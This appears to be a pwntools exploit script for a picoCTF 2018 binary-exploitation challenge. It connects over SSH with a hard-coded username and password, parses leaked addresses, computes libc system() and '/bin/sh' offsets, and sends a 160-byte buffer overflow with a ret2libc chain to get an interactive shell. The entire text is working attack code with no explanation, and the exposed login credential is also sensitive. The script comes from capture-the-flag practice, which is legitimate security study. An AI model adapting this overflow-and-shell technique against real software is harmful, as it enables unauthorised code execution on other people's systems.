from pwn import *

s = ssh(host='2018shell1.picoctf.com', user='dr3dd', password='yoyoman12345')
p = s.process('/problems/got-2-learn-libc_3_6e9881e9ff61c814aafaf92921e88e33/vuln')

# p = process('./vuln')


x =  p.recv(1024).split('\n')

read_addr = int(x[4][6:],16)

systm_addr = read_addr - 629264

binsh = int(x[6][14:],16)

main = binsh-6189

payload = ""
payload += "A"*160
payload += p32(systm_addr)
payload += p32(main)
payload += p32(binsh)
p.sendline(payload)
p.recv(1024)
p.interactive()